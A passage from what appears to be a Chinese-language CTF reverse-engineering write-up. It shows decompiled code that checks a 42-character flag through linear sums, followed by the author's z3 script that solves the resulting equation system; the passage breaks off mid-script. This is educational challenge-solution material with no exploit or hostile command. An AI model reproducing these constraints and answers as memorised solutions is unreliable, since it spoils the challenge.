int)(*(v0 + 10))) - ((unsigned int)(*(v0 + 11))) + ((unsigned int)(*(v0 + &amp;loc_C))) - ((unsigned int)(*(v0 + 13))) - ((unsigned int)(*(v0 + 14))) + ((unsigned int)(*(v0 + 15))) - ((unsigned int)(*(v0 + &amp;loc_10))) - ((unsigned int)(*(v0 + 17))) + ((unsigned int)(*(v0 + 18))) + ((unsigned int)(*(v0 + 19))) - ((unsigned int)(*(v0 + &amp;loc_14))) + ((unsigned int)(*(v0 + 21))) + (((unsigned int)(*(v0 + 22))) + ((unsigned int)(*(v0 + 23)))) + ((unsigned int)(*(v0 + &amp;loc_18))) - ((unsigned int)(*(v0 + 25))) + ((unsigned int)(*(v0 + 26))) - ((unsigned int)(*(v0 + 27))) + ((unsigned int)(*(v0 + &amp;loc_1C))) + ((unsigned int)(*(v0 + 29))) - ((unsigned int)(*(v0 + 30))) - ((unsigned int)(*(v0 + 31))) + ((unsigned int)(*(v0 + &amp;loc_20))) - ((unsigned int)(*(v0 + 33))) + ((unsigned int)(*(v0 + 34))) + ((unsigned int)(*(v0 + 35))) - ((unsigned int)(*(v0 + &amp;loc_24))) - ((unsigned int)(*(v0 + 37))) + ((unsigned int)(*(v0 + 38))) - ((unsigned int)(*(v0 + 39))) + ((unsigned int)(*(v0 + &amp;loc_28))) + ((unsigned int)(*(v0 + 41)));</span><br><span class="line">    *(v1 + &amp;loc_4) = ((unsigned int)(*v0)) - ((unsigned int)(*(v0 + 1))) + ((unsigned int)(*(v0 + 2))) - ((unsigned int)(*(v0 + 3))) - ((unsigned int)(*(v0 + &amp;loc_4))) + ((unsigned int)(*(v0 + 5))) - ((unsigned int)(*(v0 + 6))) - ((unsigned int)(*(v0 + 7))) - ((unsigned int)(*(v0 + &amp;loc_8))) - ((unsigned int)(*(v0 + 9))) + ((unsigned int)(*(v0 + 10))) - ((unsigned int)(*(v0 + 11))) + ((unsigned int)(*(v0 + &amp;loc_C))) - ((unsigned int)(*(v0 + 13))) - ((unsigned int)(*(v0 + 14))) + ((unsigned int)(*(v0 + 15))) - ((unsigned int)(*(v0 + &amp;loc_10))) - ((unsigned int)(*(v0 + 17))) + ((unsigned int)(*(v0 + 18))) - ((unsigned int)(*(v0 + 19))) + ((unsigned int)(*(v0 + &amp;loc_14))) + ((unsigned int)(*(v0 + 21))) - ((unsigned int)(*(v0 + 22))) - ((unsigned int)(*(v0 + 23))) - ((unsigned int)(*(v0 + &amp;loc_18))) + ((unsigned int)(*(v0 + 25))) - ((unsigned int)(*(v0 + 26))) + ((unsigned int)(*(v0 + 27))) - ((unsigned int)(*(v0 + &amp;loc_1C))) - ((unsigned int)(*(v0 + 29))) + ((unsigned int)(*(v0 + 30))) + (((unsigned int)(*(v0 + 31))) + ((unsigned int)(*(v0 + &amp;loc_20)))) + (((unsigned int)(*(v0 + 33))) + ((unsigned int)(*(v0 + 34))) + ((unsigned int)(*(v0 + 35)))) - ((unsigned int)(*(v0 + &amp;loc_24))) - ((unsigned int)(*(v0 + 37))) - ((unsigned int)(*(v0 + 38))) - ((unsigned int)(*(v0 + 39))) - ((unsigned int)(*(v0 + &amp;loc_28))) + ((unsigned int)(*(v0 + 41)));</span><br><span class="line">    *(v1 + &amp;loc_8) = ((unsigned int)(*v0)) - ((unsigned int)(*(v0 + 1))) + ((unsigned int)(*(v0 + 2))) + ((unsigned int)(*(v0 + 3))) - ((unsigned int)(*(v0 + &amp;loc_4))) + ((unsigned int)(*(v0 + 5))) - ((unsigned int)(*(v0 + 6))) - ((unsigned int)(*(v0 + 7))) + ((unsigned int)(*(v0 + &amp;loc_8))) - ((unsigned int)(*(v0 + 9))) - ((unsigned int)(*(v0 + 10))) - ((unsigned int)(*(v0 + 11))) - ((unsigned int)(*(v0 + &amp;loc_C))) - ((unsigned int)(*(v0 + 13))) + ((unsigned int)(*(v0 + 14))) - ((unsigned int)(*(v0 + 15))) - ((unsigned int)(*(v0 + &amp;loc_10))) + ((unsigned int)(*(v0 + 17))) + (((unsigned int)(*(v0 + 18))) + ((unsigned int)(*(v0 + 19)))) + (((unsigned int)(*(v0 + &amp;loc_14))) + ((unsigned int)(*(v0 + 21)))) - ((unsigned int)(*(v0 + 22))) + ((unsigned int)(*(v0 + 23))) + (((unsigned int)(*(v0 + &amp;loc_18))) + ((unsigned int)(*(v0 + 25)))) + ((unsigned int)(*(v0 + 26))) - ((unsigned int)(*(v0 + 27))) + ((unsigned int)(*(v0 + &amp;loc_1C))) - ((unsigned int)(*(v0 + 29))) + ((unsigned int)(*(v0 + 30))) - ((unsigned int)(*(v0 + 31))) + ((unsigned int)(*(v0 + &amp;loc_20))) + ((unsigned int)(*(v0 + 33))) - ((unsigned int)(*(v0 + 34))) - ((unsigned int)(*(v0 + 35))) + ((unsigned int)(*(v0 + &amp;loc_24))) + (((unsigned int)(*(v0 + 37))) + ((unsigned int)(*(v0 + 38)))) - ((unsigned int)(*(v0 + 39))) + ((unsigned int)(*(v0 + &amp;loc_28))) - ((unsigned int)(*(v0 + 41)));</span><br><span class="line">    *(v1 + &amp;loc_C) = ((unsigned int)(*v0)) - ((unsigned int)(*(v0 + 1))) - ((unsigned int)(*(v0 + 2))) - ((unsigned int)(*(v0 + 3))) - ((unsigned int)(*(v0 + &amp;loc_4))) - ((unsigned int)(*(v0 + 5))) + ((unsigned int)(*(v0 + 6))) + ((unsigned int)(*(v0 + 7))) - ((unsigned int)(*(v0 + &amp;loc_8))) - ((unsigned int)(*(v0 + 9))) - ((unsigned int)(*(v0 + 10))) - ((unsigned int)(*(v0 + 11))) + ((unsigned int)(*(v0 + &amp;loc_C))) - ((unsigned int)(*(v0 + 13))) + ((unsigned int)(*(v0 + 14))) - ((unsigned int)(*(v0 + 15))) + ((unsigned int)(*(v0 + &amp;loc_10))) - ((unsigned int)(*(v0 + 17))) + ((unsigned int)(*(v0 + 18))) + (((unsigned int)(*(v0 + 19))) + ((unsigned int)(*(v0 + &amp;loc_14)))) - ((unsigned int)(*(v0 + 21))) + ((unsigned int)(*(v0 + 22))) + (((unsigned int)(*(v0 + 23))) + ((unsigned int)(*(v0 + &amp;loc_18)))) - ((unsigned int)(*(v0 + 25))) - ((unsigned int)(*(v0 + 26))) + ((unsigned int)(*(v0 + 27))) - ((unsigned int)(*(v0 + &amp;loc_1C))) + ((unsigned int)(*(v0 + 29))) + ((unsigned int)(*(v0 + 30))) - ((unsigned int)(*(v0 + 31))) - ((unsigned int)(*(v0 + &amp;loc_20))) - ((unsigned int)(*(v0 + 33))) + ((unsigned int)(*(v0 + 34))) - ((unsigned int)(*(v0 + 35))) + ((unsigned int)(*(v0 + &amp;loc_24))) + (((unsigned int)(*(v0 + 37))) + ((unsigned int)(*(v0 + 38)))) - ((unsigned int)(*(v0 + 39))) + ((unsigned int)(*(v0 + &amp;loc_28))) + ((unsigned int)(*(v0 + 41)));</span><br><span class="line">    *(v1 + &amp;loc_10) = ((unsigned int)(*v0)) - ((unsigned int)(*(v0 + 1))) - ((unsigned int)(*(v0 + 2))) + ((unsigned int)(*(v0 + 3))) - ((unsigned int)(*(v0 + &amp;loc_4))) - ((unsigned int)(*(v0 + 5))) + ((unsigned int)(*(v0 + 6))) + (((unsigned int)(*(v0 + 7))) + ((unsigned int)(*(v0 + &amp;loc_8)))) + ((unsigned int)(*(v0 + 9))) - ((unsigned int)(*(v0 + 10))) + ((unsigned int)(*(v0 + 11))) + ((unsigned int)(*(v0 + &amp;loc_C))) - ((unsigned int)(*(v0 + 13))) + ((unsigned int)(*(v0 + 14))) - ((unsigned int)(*(v0 + 15))) + ((unsigned int)(*(v0 + &amp;loc_10))) + ((unsigned int)(*(v0 + 17))) - ((unsigned int)(*(v0 + 18))) + ((unsigned int)(*(v0 + 19))) - ((unsigned int)(*(v0 + &amp;loc_14))) + ((unsigned int)(*(v0 + 21))) - ((unsigned int)(*(v0 + 22))) - ((unsigned int)(*(v0 + 23))) - ((unsigned int)(*(v0 + &amp;loc_18))) + ((unsigned int)(*(v0 + 25))) - ((unsigned int)(*(v0 + 26))) - ((unsigned int)(*(v0 + 27))) - ((unsigned int)(*(v0 + &amp;loc_1C))) + ((unsigned int)(*(v0 + 29))) + (((unsigned int)(*(v0 + 30))) + ((unsigned int)(*(v0 + 31)))) - ((unsigned int)(*(v0 + &amp;loc_20))) + ((unsigned int)(*(v0 + 33))) - ((unsigned int)(*(v0 + 34))) - ((unsigned int)(*(v0 + 35))) + ((unsigned int)(*(v0 + &amp;loc_24))) - ((unsigned int)(*(v0 + 37))) + ((unsigned int)(*(v0 + 38))) - ((unsigned int)(*(v0 + 39))) - ((unsigned int)(*(v0 + &amp;loc_28))) - ((unsigned int)(*(v0 + 41)));</span><br><span class="line">    *(v1 + &amp;loc_14) = ((unsigned int)(*(v0 + 1))) + ((unsigned int)(*(v0 + 2))) + (((unsigned int)(*(v0 + 3))) + ((unsigned int)(*(v0 + &amp;loc_4)))) + (((unsigned int)(*(v0 + 5))) + ((unsigned int)(*(v0 + 6))) + (((unsigned int)(*(v0 + 7))) + ((unsigned int)(*(v0 + &amp;loc_8))))) + ((unsigned int)(*v0)) - ((unsigned int)(*(v0 + 9))) - ((unsigned int)(*(v0 + 10))) - ((unsigned int)(*(v0 + 11))) - ((unsigned int)(*(v0 + &amp;loc_C))) - ((unsigned int)(*(v0 + 13))) - ((unsigned int)(*(v0 + 14))) + ((unsigned int)(*(v0 + 15))) - ((unsigned int)(*(v0 + &amp;loc_10))) + ((unsigned int)(*(v0 + 17))) - ((unsigned int)(*(v0 + 18))) + ((unsigned int)(*(v0 + 19))) + ((unsigned int)(*(v0 + &amp;loc_14))) - ((unsigned int)(*(v0 + 21))) + ((unsigned int)(*(v0 + 22))) - ((unsigned int)(*(v0 + 23))) + ((unsigned int)(*(v0 + &amp;loc_18))) - ((unsigned int)(*(v0 + 25))) + ((unsigned int)(*(v0 + 26))) + ((unsigned int)(*(v0 + 27))) - ((unsigned int)(*(v0 + &amp;loc_1C))) + ((unsigned int)(*(v0 + 29))) - ((unsigned int)(*(v0 + 30))) + ((unsigned int)(*(v0 + 31))) + (((unsigned int)(*(v0 + &amp;loc_20))) + ((unsigned int)(*(v0 + 33)))) - ((unsigned int)(*(v0 + 34))) - ((unsigned int)(*(v0 + 35))) - ((unsigned int)(*(v0 + &amp;loc_24))) + ((unsigned int)(*(v0 + 37))) - ((unsigned int)(*(v0 + 38))) - ((unsigned int)(*(v0 + 39))) + ((unsigned int)(*(v0 + &amp;loc_28))) + ((unsigned int)(*(v0 + 41)));</span><br></pre></td></tr></table></figure><p>省略了部分代码，可以看出是对输入进行加密后，再通过输入的42位加减计算来得到输出，最终输出来与main函数里的数组进行比较，所以就变成了一个求解42元1次方程组的问题：</p><p>贴上我的z3脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">flag=[BitVec(&apos;flag%d&apos;%i,8)for i in range(42)]</span><br><span class="line">s=[-108,-200,294,-216,-1008,660,-866,1770,220,6,-244,-522,-1406,-816,386,990,334,690,-1832,372,-1370,-1580,450,-1668,858,326,-196,-1516,462,2012,-696,152,2142,-592,-68,878,-178,-1994,1472,1710,1684,34]</span><br><span class="line">solver=Solver()</span><br><span class="line">solver.add(flag[1]+flag[2]+flag[0]-flag[3]+flag[4]-flag[5]-flag[6]-flag[7]-flag[8]+flag[9]+flag[10]-flag[11]+flag[12]-flag[13]-flag[14]+flag[15]-flag[16]-flag[17]+flag[18]+flag[19]-flag[20]+flag[21]+flag[22]+flag[23]+flag[24]-flag[25]+flag[26]-flag[27]+flag[28]+flag[29]-flag[30]-flag[31]+flag[32]-flag[33]+flag[34]+flag[35]-flag[36]-flag[37]+flag[38]-flag[39]+flag[40]+flag[41]==s[0])</span><br><span class="line">solver.add(flag[0]-flag[1]+flag[2]-flag[3]-flag[4]+flag[5]-flag[6]-flag[7]-flag[8]-flag[9]+flag[10]-flag[11]+flag[12]-flag[13]-flag[14]+flag[15]-flag[16]-flag[17]+flag[18]-flag[19]+flag[20]+flag[21]-flag[22]-flag[23]-flag[24]+flag[25]-flag[26]+flag[27]-flag[28]-flag[29]+flag[30]+flag[31]+flag[32]+flag[33]+flag[34]+flag[35]-flag[36]-flag[37]-flag[38]-flag[39]-flag[40]+flag[41]==s[1])</span><br><span class="line">solver.add(flag[0]-flag[1]+flag[2]+flag[3]-flag[4]+flag[5]-flag[6]-flag[7]+flag[8]-flag[9]-flag[10]-flag[11]-flag[12]-flag[13]+flag[14]-flag[15]-flag[16]+flag[17]+flag[18]+flag[19]+flag[20]+flag[21]-flag[22]+flag[23]+flag[24]+flag[25]+flag[26]-flag[27]+flag[28]-flag[29]+flag[30]-flag[31]+flag[32]+flag[33]-flag[34]-flag[35]+flag[36]+flag[37]+flag[38]-flag[39]+flag[40]-flag[41]==s[2])</span><br><span class="line">solver.add(flag[0]-flag[1]-flag[2]-flag[3]-flag[4]-flag[5]+flag[6]+flag[7]-flag[8]-flag[9]-flag[10]-flag[11]+flag[12]-flag[13]+flag[14]-flag[15]+flag[16]-flag[17]+flag[18]+flag[19]+flag[20]-flag[21]+flag[22]+flag[23]+flag[24]-flag[25]-flag[26]+flag[27]-flag[28]+flag[29]+flag[30]-flag[31]-flag[32]-flag[33]+flag[34]-flag[35]+flag[36]+flag[37]+flag[38]-flag[39]+flag[40]+flag[41]==s[3])</span><br><span class="line">solver.add(flag[0]-flag[1]-flag[2]+flag[3]-flag[4]-flag[5]+flag[6]+flag[7]+flag[8]+flag[9]-flag[10]+flag[11]+flag[12]-flag[13]+flag[14]-flag[15]+flag[16]+flag[17]-flag[18]+flag[19]-flag[20]+flag[21]-flag[22]-flag[23]-flag[24]+flag[25]-flag[26]-flag[27]-flag[28]+flag[29]+flag[30]+flag[31]-flag[32]+flag[33]-flag[34]-flag[35]+flag[36]-flag[37]+flag[38]-flag[39]-flag[40]-flag[41]==s[4])</span><br><span class="line">solver.add(flag[1]+flag[2]+flag[3]+flag[4]+flag[5]+flag[6]+flag[7]+flag[8]+flag[0]-flag[9]-flag[10]-flag[11]-flag[12]-flag[13]-flag[14]+flag[15]-flag[16]+flag[17]-flag[18]+flag[19]+flag[20]-flag[21]+flag[22]-flag[23]+flag[24]-flag[25]+flag[26]+flag[27]-flag[28]+flag[29]-flag[30]+flag[31]+flag[32]+flag[33]-flag[34]-flag[35]-flag[36]+flag[37]-flag[38]-flag[39]+flag[40]+flag[41]==s[5])</span><br><span class="line">solver.add(flag[0]-flag[1]+flag[2]+flag[3]+flag[4]-flag[5]+flag[6]+flag[7]+flag[8]+flag[9]-flag[10]+flag[11]+flag[12]-flag[13]+flag[14]+flag[15]+flag[16]+flag[17]-flag[18]-flag[19]-flag[20]-flag[21]-flag[22]-flag[23]+flag[24]+flag[25]-flag[26]+flag[27]+flag[28]+flag[29]-flag[30]-flag[31]-flag[32]-flag[33]-flag[34]-flag[35]+flag[36]+flag[37]-flag[38]-flag[39]+flag[40]-flag[41]==s[6])</span><br><span class="line">solver.add(flag[1]+flag[0]-flag[2]-flag[3]-flag[4]+flag[5]+flag[6]-flag[7]+flag[8]+flag[9]-flag[10]+flag[11]-flag[12]+flag[13]-flag[14]+flag[15]-flag[16]+flag[17]-flag[18]-flag[19]+flag[20]-flag[21]+flag[22]-flag[23]-flag[24]+flag[25]-flag[26]+flag[27]+flag[28]+flag[29]+flag[30]+flag[31]+flag[32]-flag[33]+flag[34]-flag[35]+flag[36]+flag[37]+flag[38]+flag[39]-flag[40]-flag[41]==s[7])</span><br><span class="line">solver.add(flag[0]-flag[1]-flag[2]+flag[3]+flag[4]-flag[5]+flag[6]+flag[7]+flag[8]+flag[9]+flag[10]-flag[11]-flag[12]+flag[13]-flag[14]+flag[15]+flag[16]+flag[17]+flag[18]-flag[19]+flag[20]+flag[21]-flag[22]-flag[23]+flag[24]+flag[25]+flag[26]-flag[27]+flag[28]-flag[29]-flag[30]-flag[31]-flag[32]-flag[33]+flag[34]-flag[35]-flag[36]+flag[37]-flag[38]-flag[39]+flag[40]-flag[41]==s[8])</span><br><span class="line">solver.add(flag[1]+flag[2]+flag[0]-flag[3]+flag[4]+flag[5]+flag[6]-flag[7]-flag[8]-flag[9]-flag[10]+flag[11]+flag[12]+flag[13]-flag[14]+flag[15]+flag[16]-flag[17]-flag[18]+flag[19]+flag[20]-flag[21]-flag[22]-flag[23]+flag[24]-flag[25]-flag[26]-flag[27]+flag[28]+flag[29]+flag[30]-flag[31]+flag[32]+flag[33]-flag[34]-flag[35]-flag[36]-flag[37]+flag[38]-flag[39]+flag[40]+flag[41]==s[9])</span><br><span class="line">solver.add(flag[0]-flag[1]+flag[2]+flag[3]-flag[4]-flag[5]+flag[6]+flag[7]-flag[8]-flag[9]-flag[10]-flag[11]+flag[12]+flag[13]+flag[14]-flag[15]+flag[16]-flag[17]+flag[18]+flag[19]+flag[20]-flag[21]+flag[22]-flag[23]-flag[24]-flag[25]+flag[26]-flag[27]-flag[28]+flag[29]-flag[30]+flag[31]+flag[32]-flag[33]-flag[34]+flag[35]-flag[36]-flag[37]+flag[38]-flag[39]+flag[40]+flag[41]==s[10])</span><br><span class="line">solver.add(flag[0]-flag[1]+flag[2]+flag[3]+flag[4]-flag[5]+flag[6]+flag[7]-flag[8]+flag[9]+flag[10]-flag[11]-flag[12]-flag[13]-flag[14]+flag[15]-flag[16]-flag[17]-flag[18]+flag[19]+flag[20]-flag[21]+flag[22]-flag[23]+flag[24]+flag[25]+flag[26]+flag[27]-flag[28]+flag[29]+flag[30]-flag[31]-flag[32]-flag[33]-flag[34]-flag[35]+flag[36]+flag[37]-flag[38]-flag[39]-flag[40]-flag[41]==s[11])</span><br><span class="line">solver.add(flag[0]-flag[1]-flag[2]-flag[3]+flag[4]-flag[5]-flag[6]+flag[7]+flag[8]-flag[9]+flag[10]-flag[11]-flag[12]-flag[13]+flag[14]-flag[15]+flag[16]-flag[17]+flag[18]-flag[19]-flag[20]-flag[21]-flag[22]+flag[23]-flag[24]+flag[25]-flag[26]+flag[27]-flag[28]+flag[29]-flag[30]-flag[31]+flag[32]+flag[33]+flag[34]-flag[35]-flag[36]-flag[37]-flag[38]+flag[39]-flag[40]-flag[41]==s[12])</span><br><span class="line">solver.add(flag[0]-flag[1]+flag[2]-flag[3]+flag[4]-flag[5]+flag[6]-flag[7]+flag[8]-flag[9]+flag[10]-flag[11]+flag[12]+flag[13]+flag[14]+flag[15]-flag[16]-flag[17]-flag[18]+flag[19]+flag[20]+flag[21]-flag[22]-flag[23]+flag[24]+flag[25]-flag[26]-flag[27]+flag[28]+flag[29]-flag[30]-flag[31]-flag[32]+flag[33]-flag[34]-flag[35]+flag[36]-flag[37]-flag[38]-flag[39]+flag[40]-flag[41]==s[13])</span><br><span class="line">solver.add(flag[1]+flag[2]+flag[0]-flag[3]-flag[4]-flag[5]+flag[6]-flag[7]+flag[8]+flag[9]+flag[10]-flag[11]+flag[12]-flag[13]-flag[14]+flag[15]+flag[16]+flag[17]-flag[18]-flag[19]-flag[20]-flag[21]+flag[22]+flag[23]+flag[24]-flag[25]+flag[26]+flag[27]+flag[28]-flag[29]-flag[30]-flag[31]+flag[32]+flag[33]+flag[34]+flag[35]+flag[36]+flag[37]+flag[38]-flag[39]-flag[40]-flag[41]==s[14])</span><br><span class="line">solver.add(flag[0]-flag[1]+flag[2]+flag[3]+flag[4]+flag[5]-flag[6]+flag[7]-flag[8]-flag[9]-flag[10]+flag[11]+flag[12]+flag[13]-flag[14]-flag[15]-flag[16]+flag[17]-flag[18]-flag[19]-flag[20]-flag[21]+flag[22]+flag[23]+flag[24]+flag[25]+flag[26]+flag[27]-flag[28]-flag[29]-flag[30]-flag[31]+flag[32]-flag[33]+flag[34]+flag[35]+flag[36]+flag[37]-flag[38]+flag[39]+flag[40]-flag[41]==s[15])</span><br><span class="line">solver.add(flag[0]-flag[1]+flag[2]+flag[3]-flag[4]-flag[5]+flag[6]+flag[7]+flag[8]+flag[9]+flag[10]-flag[11]+flag[12]-flag[13]+flag[14]+flag[15]+flag[16]-flag[17]+flag[18]-flag[19]+flag[20]-flag[21]-flag[22]-flag[23]-flag[24]-flag[25]+flag[26]+flag[27]+flag[28]+flag[29]-flag[30]-flag[31]+flag[32]-flag[33]-flag[34]+flag[35]-flag[36]+flag[37]-flag[38]+flag[39]-flag[40]+flag[41]==s[16])</span><br><span class="line">solver.add(flag[1]+flag[2]+flag[3]+flag[4]+flag[0]-flag[5]+flag[6]+flag[7]+flag[8]-flag[9]-flag[10]+flag[11]-flag[12]+flag[13]+flag[14]+flag[15]-flag[16]+flag[17]-flag[18]-flag[19]+flag[20]-flag[21]+flag[22]-flag[23]-flag[24]+flag[25]-flag[26]+flag[27]-flag[28]+flag[29]-flag[30]-flag[31]+flag[32]-flag[33]-flag[34]+flag[35]-flag[36]+flag[37]-flag[38]+flag[39]+flag[40]-flag[41]==s[17])</span><br><span class="line">solver.add(flag[0]-flag[1]-flag[2]-flag[3]+flag[4]+flag[5]-flag[6]+flag[7]-flag[8]+flag[9]+flag[10]-flag[11]-flag[12]-flag[13]+flag[14]-flag[15]-flag[16]+flag[17]+flag[18]+flag[19]-flag[20]-flag[21]-flag[22]-flag[23]-flag[24]-flag[25]-flag[26]-flag[27]+flag[28]+flag[29]+flag[30]-flag[31]-flag[32]-flag[33]+flag[34]-flag[35]-flag[36]-flag[37]-flag[38]-flag[39]-flag[40]+flag[41]==s[18])</span><br><span class="line">solver.add(flag[1]+flag[2]+flag[3]+flag[0]-flag[4]-flag[5]+flag[6]-flag[7]-flag[8]-flag[9]-flag[10]-flag[11]-flag[12]-flag[13]+flag[14]+flag[15]+flag[16]-flag[17]+flag[18]+flag[19]+flag[20]+flag[21]-flag[22]+flag[23]+flag[24]-flag[25]+flag[26]+flag[27]-flag[28]+flag[29]+flag[30]+flag[31]+flag[32]+flag[33]-flag[34]+flag[35]-flag[36]-flag[37]-flag[38]+flag[39]+flag[40]-flag[41]==s[19])</span><br><span class="line">solver.add(flag[1]+flag[0]-flag[2]-flag[3]-flag[4]+flag[5]-flag[6]+flag[7]-flag[8]-flag[9]+flag[10]+flag[11]-flag[12]-flag[13]+flag[14]-flag[15]-flag[16]+flag[17]-flag[18]-flag[19]+flag[20]+flag[21]-flag[22]+flag[23]+flag[24]-flag[25]-flag[26]-flag[27]-flag[28]-flag[29]-flag[30]-flag[31]-flag[32]+flag[33]-flag[34]+flag[35]+flag[36]-flag[37]+flag[38]-flag[39]+flag[40]-flag[41]==s[20])</span><br><span class="line">solver.add(flag[0]-flag[1]-flag[2]-flag[3]+flag[4]+flag[5]+flag[6]+flag[7]-flag[8]-flag[9]-flag[10]-flag[11]-flag[12]-flag[13]-flag[14]-flag[15]-flag[16]+flag[17]-flag[18]-flag[19]+flag[20]-flag[21]+flag[22]+flag[23]+flag[24]-flag[25]-flag[26]+flag[27]-flag[28]-flag[29]-flag[30]-flag[31]-flag[32]-flag[33]-flag[34]-flag[35]-flag[36]+flag[37]-flag[38]-flag[39]-flag[40]+flag[41]==s[21])</span><br><span class="line">solver.add(flag[1]+flag[2]+flag[3]+flag[4]+flag[5]+flag[6]+flag[7]+flag[0]-flag[8]+flag[9]-flag[10]+flag[11]-flag[12]+flag[13]+flag[14]+flag[15]-flag[16]+flag[17]+flag[18]-flag[19]-flag[20]+flag[21]+flag[22]-flag[23]+flag[24]-flag[25]-flag[26]+flag[27]-flag[28]+flag[29]+flag[30]+flag[31]-flag[32]+flag[33]-flag[34]-flag[35]-flag[36]-flag[37]+flag[38]-flag[39]+flag[40]+flag[41]==s[22])</span><br><span class="line">solver.add(flag[0]-flag[1]+flag[2]+flag[3]-flag[4]-flag[5]-flag[6]-flag[7]+flag[8]-flag[9]-flag[10]+flag[11]+flag[12]-flag[13]-flag[14]+flag[15]-flag[16]-flag[17]+flag[18]+flag[19]-flag[20]-flag[21]+flag[22]-flag[23]+flag[24]+flag[25]-flag[26]+flag[27]-flag[28]+flag[29]+flag[30]-flag[31]-flag[32]-flag[33]-flag[34]-flag[35]-flag[36]-flag[37]+flag[38]-flag[39]-flag[40]-flag[41]==s[23])</span><br><span class="line">solver.add(flag[1]+flag[0]-flag[2]+flag[3]+flag[4]-flag[5]+flag[6]+flag[7]-flag[8]+flag[9]+flag[10]-flag[11]-flag[12]-flag[13]-flag[14]+flag[15]+flag[16]+flag[17]-flag[18]+flag[19]+flag[20]+flag[21]+flag[22]+flag[23]+flag[24]+flag[25]-flag[26]-flag[27]-flag[28]+flag[29]+flag[30]-flag[31]+flag[32]+flag[33]+flag[34]-flag[35]-flag[36]-flag[37]-flag[38]+flag[39]+flag[40]-flag[41]==s[24])</span><br><span class="line">solver.add(flag[0]-flag[1]+flag[2]+flag[3]-flag[4]+flag[5]+flag[6]-flag[7]+flag[8]+flag[9]+flag[10]-flag[11]-flag[12]+flag[13]-flag[14]+flag[15]-flag[16]+flag[17]+flag[18]+flag[19]-flag[20]-flag[21]+flag[22]+flag[23]-flag[24]-flag[25]+flag[26]-flag[27]+flag[28]-flag[29]+flag[30]-flag[31]-flag[32]+flag[33]-flag[34]-flag[35]-flag[36]-flag[37]+flag[38]-flag[39]+flag[40]+flag[41]==s[25])</span><br><span class="line">solver.add(flag[1]+flag[2]+flag[3]+flag[4]+flag[0]-flag[5]-flag[6]+flag[7]-flag[8]-flag[9]-flag[10]-flag[11]+flag[12]-flag[13]+flag[14]-flag[15]+flag[16]-flag[17]+flag[18]-flag[19]-flag[20]+flag[21]+flag[22]+flag[23]+flag[24]+flag[25]-flag[26]-flag[27]-flag[28]-flag[29]+flag[30]+flag[31]-flag[32]-flag[33]-flag[34]+flag[35]+flag[36]-flag[37]-flag[38]+flag[39]+flag[40]+flag[41]==s[26])</span><br><span class="line">solver.add(flag[0]-flag[1]+flag[2]-flag[3]+flag[4]-flag[5]-flag[6]-flag[7]-flag[8]-flag[9]-flag[10]-flag[11]+flag[12]+flag[13]-flag[14]+flag[15]+flag[16]+flag[17]+flag[18]+flag[19]-flag[20]-flag[21]-flag[22]-flag[23]+flag[24]+flag[25]+flag[26]-flag[27]+flag[28]+flag[29]+flag[30]-flag[31]-flag[32]-flag[33]-flag[34]+flag[35]-flag[36]-flag[37]-flag[38]-flag[39]-flag[40]-flag[41]==s[27])</span><br><span class="line">solver.add(flag[0]-flag[1]+flag[2]+flag[3]+flag[4]-flag[5]+flag[6]+flag[7]-flag[8]-flag[9]+flag[10]+flag[11]-flag[12]+flag[13]-flag[14]+flag[15]-flag[16]+flag[17]+flag[18]+flag[19]-flag[20]-flag[21]+flag[22]-flag[23]-flag[24]-flag[25]-flag[26]+flag[27]-flag[28]-flag[29]-flag[30]+flag[31]-flag[32]-flag[33]+flag[34]+flag[35]+flag[36]-flag[37]-flag[38]+flag[39]+flag[40]+flag[41]==s[28])</span><br><span class="line">solver.add(flag[1]+flag[0]-flag[2]-flag[3]-flag[4]+flag[5]+flag[6]+flag[7]-flag[8]+flag[9]-flag[10]-flag[11]+flag[12]-flag[13]+flag[14]+flag[15]-flag[16]+flag[17]+flag[18]-flag[19]+flag[20]+flag[21]+flag[22]+flag[23]-flag[24]+flag[25]+flag[26]-flag[27]+flag[28]+flag[29]+flag[30]+flag[31]+flag[32]-flag[33]-flag[34]+flag[35]+flag[36]-flag[37]+flag[38]+flag[39]-flag[40]+flag[41]==s[29])</span><br><span class="line">solver.add(flag[1]+flag[2]+flag[3]+flag[0]-flag[4]-flag[5]-flag[6]-flag[7]+flag[8]+flag[9]-flag[10]-flag[11]-flag[12]+flag[13]-flag[14]-flag[15]+flag[16]-flag[17]-flag[18]-flag[19]+flag[20]-flag[21]-flag[22]+flag[23]+flag[24]-flag[25]-flag[26]+flag[27]-flag[28]-flag[29]-flag[30]-flag[31]-flag[32]-flag[33]-flag[34]+flag[35]+flag[36]+flag[37]-flag[38]+flag[39]+flag[40]+flag[41]==s[30])</span><br><span class="line">solver.add(flag[1]+flag[0]-flag[2]+flag[3]+flag[4]-flag[5]-flag[6]+flag[7]+flag[8]+flag[9]+flag[10]+flag[11]+flag[12]-flag[13]-flag[14]-flag[15]+flag[16]+flag[17]+flag[18]+flag[19]-flag[20]+flag[21]-flag[22]+flag[23]-flag[24]-flag[25]+flag[26]+flag[27]-flag[28]+flag[29]-flag[30]-flag[31]-flag[32]+flag[33]-flag[34]+flag[35]-flag[36]+flag[37]-flag[38]+flag[39]-flag[40]-flag[41]==s[31])</span><br><span 